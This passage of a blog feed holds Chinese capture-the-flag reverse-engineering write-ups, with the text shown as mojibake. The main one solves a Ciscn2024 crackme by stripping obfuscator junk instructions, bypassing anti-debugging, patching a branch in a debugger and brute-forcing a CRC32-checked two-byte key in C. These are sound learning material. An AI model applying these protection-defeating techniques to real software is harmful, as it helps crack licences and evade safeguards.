Input[i] = ((Input[i] &gt;&gt; <span class="number">3</span>) | (Input[i] &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = Input[i] ^ v26;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0x8C90F77B</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Decrypt</span>(EncFlag, Key);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        EncFlag[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-8"><a href="#Flagå€¼-8" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;&#125;&#125;&#125;&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GHCTF-2025-Reverse-WP&quot;&gt;&lt;a href=&quot;#GHCTF-2025-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;GHCTF 2025 Reverse WP&quot;&gt;&lt;/a&gt;GHCTF 2025 Reverse WP&lt;/</summary>
      
    
    
    
    
    <category term="CTFå‡ºé¢˜" scheme="https://tkazer.github.io/tags/CTF%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn2024-é€†å‘0è§£é¢˜-VT</title>
    <link href="https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/"/>
    <id>https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/</id>
    <published>2025-02-20T15:36:15.000Z</published>
    <updated>2025-02-21T03:18:32.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ciscn2024-é€†å‘0è§£é¢˜-VT"><a href="#Ciscn2024-é€†å‘0è§£é¢˜-VT" class="headerlink" title="Ciscn2024-é€†å‘0è§£é¢˜-VT"></a>Ciscn2024-é€†å‘0è§£é¢˜-VT</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é¢˜ä¸æƒ³åæ§½ä»€ä¹ˆï¼Œåˆ©ç”¨å¼€æºçš„æ··æ·†é¡¹ç›®å°†ä»£ç æ··æ·†å°±æ˜¯ä¸€é“é¢˜ã€‚ç”±äºé€†å‘åŠŸåº•ä¸å¤Ÿä¸”èŠ±æŒ‡ä»¤æ ·å¼éšæœºå¤šå˜ï¼Œåªèƒ½æ‰‹åŠ¨å»é™¤èŠ±æŒ‡ä»¤ï¼Œè¿™éƒ¨åˆ†å°±èŠ±äº†ä¸€ä¸ªå°æ—¶å·¦å³ã€‚å½“æ—¶æ¯”èµ›æ—¶çœ‹åˆ°ä¸€å¨æ··æ·†ç›´æ¥æ”¾å¼ƒäº†ï¼Œç°åœ¨é‡æ–°åšä¸€éå‘ç°å…¶å®èŠ±ç‚¹æ—¶é—´å…¶å®ä¹Ÿæ˜¯å¯ä»¥è§£å‡ºçš„ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ç¨‹åºåˆ†æ-å¼€æºæ··æ·†é¡¹ç›®"><a href="#ç¨‹åºåˆ†æ-å¼€æºæ··æ·†é¡¹ç›®" class="headerlink" title="ç¨‹åºåˆ†æ&amp;å¼€æºæ··æ·†é¡¹ç›®"></a>ç¨‹åºåˆ†æ&amp;å¼€æºæ··æ·†é¡¹ç›®</h3><p>é¦–å…ˆæ˜¯ä¾‹å¸¸Dieï¼Œå‘ç°å’Œå Buffä¸€æ ·çš„ä¸€ç³»åˆ—ç‰¹å¾ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/1.png" alt="alt text"></p><p>åç»­åœ¨Githubä¸Šæ‰¾åˆ°äº†è¿™ä¸ªæ··æ·†çš„é¡¹ç›®ï¼ˆobfus.hï¼‰ï¼Œåªæ˜¯ç”¨ä¸€ç³»åˆ—ç‰¹å¾æ¥ä¼ªé€ ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/2.png" alt="alt text"></p><p>å¤§æ¦‚é˜…è§ˆäº†ä¸€ä¸‹è¿™ä¸ªæ··æ·†é¡¹ç›®ï¼Œå°±æ˜¯åˆ©ç”¨ä¸€å †èŠ±æŒ‡ä»¤å’Œé€»è¾‘æ··æ·†å¤„ç†ä»£ç ï¼Œç„¶åå°è£…äº†ä¸€äº›å¸¸ç”¨å‡½æ•°ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/3.png" alt="alt text"></p><p>è¿™ä¸ªé¡¹ç›®æœ€æ–°ç‰ˆçš„GetProcAddressæ˜¯è‡ªå·±é‡æ–°å°è£…å®ç°çš„ï¼Œè€Œé€šè¿‡dbgæ–­ç‚¹å‘ç°é¢˜ç›®ç¨‹åºçš„GetProcAddressæ˜¯å¯ä»¥æ–­ä¸‹æ¥çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æŸä¸ªå†å²ç‰ˆæœ¬è€Œéæœ€æ–°ï¼Œè‡³å°‘æ˜¯åœ¨è¿™ä¸ªç‰ˆæœ¬ä¹‹å‰ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/4.png" alt="alt text"></p><h3 id="å»é™¤èŠ±æŒ‡ä»¤"><a href="#å»é™¤èŠ±æŒ‡ä»¤" class="headerlink" title="å»é™¤èŠ±æŒ‡ä»¤"></a>å»é™¤èŠ±æŒ‡ä»¤</h3><p>è¿™ä¸ªç¨‹åºèŠ±æŒ‡ä»¤å«ä»¥ä¸‹å‡ ç§ï¼ˆå¯èƒ½æ²¡æˆªå…¨ï¼‰ï¼Œå¤§å¤šéƒ½æ˜¯å¸¸è§„èŠ±æŒ‡ä»¤ï¼Œå¯ä»¥ç›´æ¥æŒ‰Uï¼Œå†è·³è¿‡æŒ‡å®šå­—èŠ‚æ•°ï¼ŒæŒ‰Cé‡æ„ä»£ç ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/5.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/6.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/7.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/8.png" alt="alt text"></p><p>ç„¶åä»¥ä¸‹æ˜¯ä¸€ä¸ªç‰¹æ®Šæƒ…å†µçš„èŠ±æŒ‡ä»¤ï¼Œå›¾1æ˜¯èŠ±æŒ‡ä»¤ï¼Œå›¾2æ˜¯å»èŠ±åçš„ï¼Œéœ€è¦è·³è¿‡ç®­å¤´å¤„jmpçš„ç¬¬ä¸€ä¸ª0xEBå­—èŠ‚ï¼Œç„¶åå†é‡æ„ä»£ç ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/9.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/10.png" alt="alt text"></p><p>ç„¶åæ¥ä¸‹æ¥å°±æ˜¯é‡å¤çš„æ“ä½œï¼Œè¿™éƒ¨åˆ†å¯ä»¥åˆ©ç”¨idcè„šæœ¬è¿›è¡Œä¸€é”®å»é™¤ï¼Œç”±äºæˆ‘åšçš„æ—¶å€™ä¸ºäº†ä¿è¯å»é™¤æ‰€æœ‰èŠ±æŒ‡ä»¤ï¼Œå°±éƒ½æ‰‹åŠ¨æ“ä½œï¼ŒèŠ±äº†ä¸€ä¸ªå°æ—¶å·¦å³ã€‚</p><h3 id="å»èŠ±åç¨‹åºAPI"><a href="#å»èŠ±åç¨‹åºAPI" class="headerlink" title="å»èŠ±åç¨‹åºAPI"></a>å»èŠ±åç¨‹åºAPI</h3><p>å»èŠ±é‡æ„å‡½æ•°è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å‘ç°æœ‰å¾ˆå¤šè¿™æ ·ç±»ä¼¼çš„å‡½æ•°ï¼Œå…¶å®å°±æ˜¯ä¹‹å‰åœ¨å¼€æºæ··æ·†é¡¹ç›®çš„ä»£ç ä¸­çœ‹åˆ°çš„é‚£äº›è‡ªå°è£…å‡½æ•°ï¼Œå°±æ˜¯å°è£…èµ·æ¥è°ƒç”¨ç³»ç»ŸAPIçš„ä¸€ä¸ªä»£ç†å‡½æ•°ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/11.png" alt="alt text"></p><p>å¤§æ¦‚æœ‰è¿™ä¹ˆå¤šï¼Œå’Œå¼€æºé¡¹ç›®é‡Œé¢å·®ä¸å¤šä¸€è‡´ï¼Œä¸è¿‡å¹¶æ²¡æœ‰æ‰€æœ‰apiéƒ½è¢«è°ƒç”¨åˆ°ã€‚ï¼ˆçº¢å‰å¤„æ˜¯åç»­åˆ†æåŠŸèƒ½è‡ªå‘½åçš„ï¼‰</p><p><img src="/2025/02/20/Ciscn-reverse-vt/12.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/13.png" alt="alt text"></p><h3 id="Mainå‡½æ•°åˆ†æ"><a href="#Mainå‡½æ•°åˆ†æ" class="headerlink" title="Mainå‡½æ•°åˆ†æ"></a>Mainå‡½æ•°åˆ†æ</h3><p>é€šè¿‡startå‡½æ•°è¿›å…¥mainå‡½æ•°ï¼Œå‘ç°æœ‰åè°ƒè¯•ä»£ç ï¼ˆå¦‚IsDebuggerPresentï¼‰ï¼Œä¸”åœ¨ä»¥ä¸‹ä»£ç æ®µå‘ç°æœ‰é€šè¿‡è°ƒç”¨GetCommandLineAè·å–ç¨‹åºè¿è¡Œçš„å‘½ä»¤è¡Œã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/14.png" alt="alt text"></p><p>è°ƒè¯•å°è¯•è¿è¡Œåå‘ç°ç¨‹åºä¼šä½¿ç”¨åˆ°å‘½ä»¤è¡Œè¿è¡Œç¨‹åºé™„å¸¦çš„å‰ä¸¤ä¸ªå‚æ•°ã€‚ä¸‹å›¾è¿™éƒ¨åˆ†ä»£ç å°±æ˜¯åœ¨mainå‡½æ•°ä¸­å°†ç¬¬äºŒä¸ªå‘½ä»¤è¡Œå‚æ•°é€šè¿‡atoiè½¬æˆProcessIdè¿›è¡Œåç»­æ“ä½œï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°å°±åº”è¯¥æ˜¯æŸä¸ªè¿›ç¨‹çš„IDã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/15.png" alt="alt text"></p><p>åœ¨ä¸‹é¢å‘ç°æœ‰åˆ›å»ºçº¿ç¨‹çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åˆ›å»ºmark2å‡½æ•°çº¿ç¨‹ï¼ˆè‡ªå‘½åçš„ï¼‰ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/35.png" alt="alt text"></p><p>å°è¯•å¸¦å‚è°ƒè¯•ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½çœ‹mark2é‡Œé¢åšäº†ä»€ä¹ˆã€‚ç¬¬ä¸€ä¸ªå‚æ•°éšä¾¿å¡«ï¼Œç¬¬äºŒä¸ªå‚æ•°éšä¾¿å¡«ä¸€ä¸ªè¿›ç¨‹IDï¼ˆå¿…é¡»è¦æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå¦‚æœä¸æ˜¯çœŸå®PIDåˆ™Mainå‡½æ•°ä¸ä¼šé˜»å¡ï¼Œè€Œæ˜¯ä¼šè·³åˆ°æœ€åè°ƒç”¨Exitå‡½æ•°ï¼‰ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/16.png" alt="alt text"></p><p>ç„¶åæ–­ç‚¹åœ¨Mainå‡½æ•°å¼€å¤´å¤„ï¼Œä½¿ç”¨ScyllaHideæ’ä»¶è¿›è¡Œä¸€é”®å»åè°ƒè¯•ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/17.png" alt="alt text"></p><p>è°ƒè¯•è¿è¡Œå‘ç°æ²¡æ³•æ‰§è¡Œåˆ°åˆ›å»ºçº¿ç¨‹çš„è¿™ä¸ªä»£ç æ®µï¼Œçœ‹æ±‡ç¼–æ®µå‘ç°æ˜¯è¿™è¾¹åˆ¤æ–­ecxç­‰äº0ï¼Œæ‰€ä»¥è·³è½¬èµ°äº†ï¼Œæ²¡æœ‰æ‰§è¡Œã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/18.png" alt="alt text"></p><p>ç”±äºä¸çŸ¥é“è¿™è¾¹ecxéœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼Œç›´æ¥ä¸‹æ¡ä»¶æ–­ç‚¹åœ¨cmpå¤„ï¼Œå°†ecxè®¾ç½®ä¸º1ï¼Œå¼ºåˆ¶æ‰§è¡Œä¸‹é¢çš„åˆ›å»ºçº¿ç¨‹ä»£ç ï¼Œä¾¿å¯ä»¥è¿›å…¥mark2å‡½æ•°è¿›è¡Œä¸‹ä¸€æ­¥åˆ†æã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/19.png" alt="alt text"></p><h3 id="Mark2å‡½æ•°åˆ†æ"><a href="#Mark2å‡½æ•°åˆ†æ" class="headerlink" title="Mark2å‡½æ•°åˆ†æ"></a>Mark2å‡½æ•°åˆ†æ</h3><p>å‘ç°æœ‰ç±»ä¼¼è¢«åŠ å¯†çš„æ•°æ®ï¼ˆä»¥ä¸‹ç§°encFlagï¼‰ï¼Œéƒ¨åˆ†å˜é‡åå’Œå‡½æ•°å·²ç»è¢«æˆ‘é‡å‘½åäº†ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/20.png" alt="alt text"></p><p>param1_bytes_2æŒ‡é’ˆè¿›å…¥ä¸¤å±‚è·³è½¬è¿‡å»å‘ç°ï¼Œæ•°æ®æŒ‡å‘çš„æ˜¯æˆ‘ä»¬å‚æ•°1å­—ç¬¦ä¸²unhexåçš„å­—èŠ‚æ•°æ®ï¼Œæ‰€ä»¥å°±å¯ä»¥çŒœæµ‹ç»™param1_bytes_2èµ‹å€¼çš„å‡½æ•°å°±æ˜¯ç±»ä¼¼unhexå‡½æ•°ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/21.png" alt="alt text"></p><p>ç„¶åä¸‹é¢encFlagèµ‹å€¼åè¿›è¡Œäº†é‡èµ‹å€¼ï¼Œåˆ©ç”¨ä¹‹å‰çš„encFlagå€¼ï¼Œè°ƒç”¨ä¸€ä¸ªå‡½æ•°ç”Ÿæˆäº†ä¸€ç³»åˆ—keyå€¼ï¼Œç„¶åç”¨keyå€¼å¼‚æˆ–ä¸Šparam1_bytes_2ï¼Œè¿™è¾¹æ˜¯i%2ï¼Œæ‰€ä»¥å°±ä¸€ç›´å¾ªç¯å¼‚æˆ–è¿™ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°1è¿›è¡Œunhexåçš„ä¸¤ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/22.png" alt="alt text"></p><p>ç”±äºencFlagä¹‹å‰çš„å€¼æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç”Ÿæˆçš„ä¸€ç³»åˆ—Keyä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨æ¡ä»¶æ–­ç‚¹åœ¨ç»™Keyèµ‹å€¼çš„åœ°æ–¹å°†ä»–è¾“å‡ºã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/23.png" alt="alt text"></p><p>å¾—åˆ°ä»¥ä¸‹Keyå€¼åˆ—è¡¨ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/24.png" alt="alt text"></p><p>åœ¨encFlagé‡èµ‹å€¼ä¸‹é¢ï¼Œè°ƒç”¨äº†ä¸€ä¸ªè®¡ç®—callä¼ å…¥encFlagï¼Œè®¡ç®—è¿”å›ä¸€ä¸ª4å­—èŠ‚æ•°å€¼ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/25.png" alt="alt text"></p><p>ä¸”åœ¨ä¸‹é¢éƒ¨åˆ†å¯ä»¥çœ‹åˆ°å¯¹v22åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º0xF703DF16ï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™ä¼šæ‰§è¡Œåˆ°è¿™ä¸ªreturnç›´æ¥è¿”å›ï¼Œä¸ä¼šç»§ç»­æ‰§è¡Œä¸‹é¢éƒ¨åˆ†ä»£ç ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/26.png" alt="alt text"></p><p>åœ¨ä¸‹é¢æœªæ‰§è¡Œä»£ç ä¸­çœ‹åˆ°äº†ç±»ä¼¼å¯¹encFlagè¿›è¡Œè§£å¯†çš„å‡½æ•°Callï¼Œå¹¶ä¸”åœ¨ä¸‹é¢çœ‹åˆ°äº†åˆ¤æ–­è§£å¯†åæ•°æ®ç»“å°¾æ˜¯å¦æ˜¯ä¸ºâ€™}â€™ï¼Œå¦‚æœæ˜¯å°±breakã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/27.png" alt="alt text"></p><p>ä¸”åœ¨æœ€åº•ä¸‹ä»£ç çœ‹åˆ°ä¸€ä¸ªprintfå‡½æ•°çš„è°ƒç”¨ï¼Œè¾“å‡ºäº†è§£å¯†åçš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/28.png" alt="alt text"></p><h3 id="ç¨‹åºæµç¨‹æ€»ç»“"><a href="#ç¨‹åºæµç¨‹æ€»ç»“" class="headerlink" title="ç¨‹åºæµç¨‹æ€»ç»“"></a>ç¨‹åºæµç¨‹æ€»ç»“</h3><ol><li><p>é¦–å…ˆè¦å¸¦ä¸¤ä¸ªå‚æ•°è¿è¡Œç¨‹åºï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯4é•¿åº¦å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„æŸä¸ªè¿›ç¨‹IDã€‚</p></li><li><p>æ»¡è¶³æŸä¸ªæ¡ä»¶åˆ›å»ºçº¿ç¨‹æ‰§è¡Œmark2å‡½æ•°è¿›è¡Œå‡½æ•°ä¸»è§£å¯†æµç¨‹ã€‚</p></li><li><p>å°†ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œunhexï¼Œè½¬æˆ2å­—èŠ‚æ•°æ®ï¼Œä¸å›ºå®šå¼‚æˆ–åˆ—è¡¨è¿›è¡Œä¸€æ¬¡å¼‚æˆ–è®¡ç®—ï¼Œå†è°ƒç”¨ä¸€ä¸ªè®¡ç®—callå¾—åˆ°ä¸€ä¸ª4å­—èŠ‚æ•°æ®ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯0xF703DF16ã€‚</p></li><li><p>å°†é€šè¿‡å‚æ•°1å¤„ç†åçš„åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†å¾—åˆ°flagï¼Œç„¶åprintfè¾“å‡ºã€‚</p></li></ol><p>æ‰€ä»¥æœ€ä¸»è¦æ˜¯å°±æ˜¯åˆ†æcalcå‡½æ•°ï¼Œç”¨ä»£ç æ¨¡æ‹Ÿcalcå‡½æ•°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯å‚æ•°ä¸€é‚£ä¸¤ä¸ªå­—èŠ‚ï¼Œæ¥ä¸‹æ¥å°±åˆ†æcalcå‡½æ•°ã€‚</p><h3 id="calcå‡½æ•°åˆ†æ"><a href="#calcå‡½æ•°åˆ†æ" class="headerlink" title="calcå‡½æ•°åˆ†æ"></a>calcå‡½æ•°åˆ†æ</h3><p>ä»ä¸Šæ–‡å¯ä»¥çŸ¥é“calcå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥ä¸€ä¸ª48é•¿åº¦å­—èŠ‚æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯48ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°åº”è¯¥å°±æ˜¯è¾“å…¥æ•°æ®çš„é•¿åº¦ã€‚</p><p>é€šè¿‡åŠ¨è°ƒèµ°ä¸€éæµç¨‹ï¼Œç¡®å®šå…³é”®è®¡ç®—ä»£ç ï¼Œå¿½ç•¥å…¶ä»–çš„é€»è¾‘æ··æ·†ã€‚</p><p>æœ€å¤–å±‚æ˜¯é€šè¿‡lenè¿›è¡Œä¸€æ¬¡æ•°æ®éå†ï¼Œå†…å±‚æ˜¯è¿›è¡Œ8æ¬¡çš„å¾ªç¯ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/29.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/30.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/31.png" alt="alt text"></p><p>å¯ä»¥ç”¨c++é‡å†™å‡ºåŸå§‹çš„calcå‡½æ•°ä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="çˆ†ç ´å¯†é’¥ï¼ˆå‚æ•°ä¸€ï¼‰"><a href="#çˆ†ç ´å¯†é’¥ï¼ˆå‚æ•°ä¸€ï¼‰" class="headerlink" title="çˆ†ç ´å¯†é’¥ï¼ˆå‚æ•°ä¸€ï¼‰"></a>çˆ†ç ´å¯†é’¥ï¼ˆå‚æ•°ä¸€ï¼‰</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">short</span> Param1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// çˆ†ç ´2å­—èŠ‚</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Param1 = i;</span><br><span class="line">        <span class="comment">// idaæ¡ä»¶æ–­ç‚¹å¾—åˆ°çš„keyå€¼åˆ—è¡¨</span></span><br><span class="line"><span class="type">uint8_t</span> KeyList[]&#123;</span><br><span class="line"><span class="number">82</span>,<span class="number">225</span>,<span class="number">68</span>,<span class="number">226</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">94</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">25</span>,<span class="number">152</span>,<span class="number">80</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">193</span>,<span class="number">80</span>,<span class="number">158</span>,<span class="number">82</span>,<span class="number">130</span>,</span><br><span class="line"><span class="number">39</span>,<span class="number">130</span>,<span class="number">38</span>,<span class="number">231</span>,<span class="number">83</span>,<span class="number">128</span>,<span class="number">36</span>,<span class="number">128</span>,<span class="number">66</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">57</span>,<span class="number">158</span>,<span class="number">2</span>,<span class="number">148</span>,<span class="number">39</span>,<span class="number">129</span>,<span class="number">69</span>,<span class="number">131</span>,<span class="number">81</span>,<span class="number">147</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">128</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Enc[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span>* pParam1 = (<span class="type">uint8_t</span>*)(<span class="type">uint64_t</span>)(&amp;Param1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calcä¹‹å‰çš„å¼‚æˆ–è®¡ç®—</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span 